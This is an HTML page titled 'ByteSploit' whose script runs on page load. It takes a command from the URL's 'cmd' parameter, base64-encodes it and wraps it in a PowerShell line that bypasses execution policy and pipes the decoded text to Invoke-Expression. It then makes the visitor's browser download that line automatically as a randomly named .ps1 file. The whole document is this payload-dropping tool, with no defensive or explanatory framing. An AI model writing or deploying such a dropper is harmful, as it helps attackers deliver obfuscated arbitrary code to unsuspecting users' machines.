<!DOCTYPE html>
<html>
	<title>ByteSploit</title>
	<script>
		function createPowerShellScript() {
			// Get arguments from form input or URL
			var urlParams = new URLSearchParams(window.location.search);
			var urlcmd = urlParams.get('cmd');
			if (urlcmd !== null) {
				cmd = btoa(urlcmd); // Encode the cmd variable in base64
			}
			// Create PowerShell script content
			var content = "powershell -ExecutionPolicy Bypass -Command \"[Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + cmd + "'))\" | Invoke-Expression";

			// Create Blob object
			var blob = new Blob([content], { type: 'text/plain' });

			// Generate random filename
			var filename = Math.random().toString(36).substring(2) + '.ps1';

			// Generate download URL and set it as the href of a link
			var link = document.createElement('a');
			link.download = filename;
			link.href = URL.createObjectURL(blob);
			link.click();
		}

		// Set default value of cmd from URL and create PowerShell script
		var urlParams = new URLSearchParams(window.location.search);
		var urlcmd = urlParams.get('cmd');
		if (urlcmd !== null) {
			var cmd = btoa(urlcmd); // Encode the cmd variable in base64
			createPowerShellScript();
		}
	</script>
	<body>
	</body>
</html>
